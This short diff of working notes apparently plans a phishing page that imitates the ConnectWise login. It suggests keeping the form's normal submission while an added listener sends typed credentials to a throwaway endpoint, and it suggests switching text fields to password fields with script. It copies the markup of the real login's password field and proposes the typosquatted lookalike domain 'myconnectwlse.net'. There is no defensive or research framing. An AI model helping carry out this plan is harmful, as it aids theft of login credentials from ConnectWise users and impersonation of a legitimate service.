@@ -18,3 +18,12 @@ let the form submit to its original location but add an event listener on the fo
 might be able to utilize a throwaway thing like ( a stackblitz project) to get a simple https uri to post to.
 
 you could also create the fields as input="text" and when the user starts typing you could change it to type="password" with js
+
+trying contenteditable 
+<input autocapitalize="none" autocomplete="off" autocorrect="off" class="loginTextBox" id="password" name="password" onkeypress="javascript: if(event.keyCode==13) {document.getElementById(&#39;loginForm&#39;).submit()}" placeholder="Password" spellcheck="false" type="password"/>
+
+I need a domain that looks like 
+http://na.myconnectwise.net
+myconnectwlse.net 
+
+
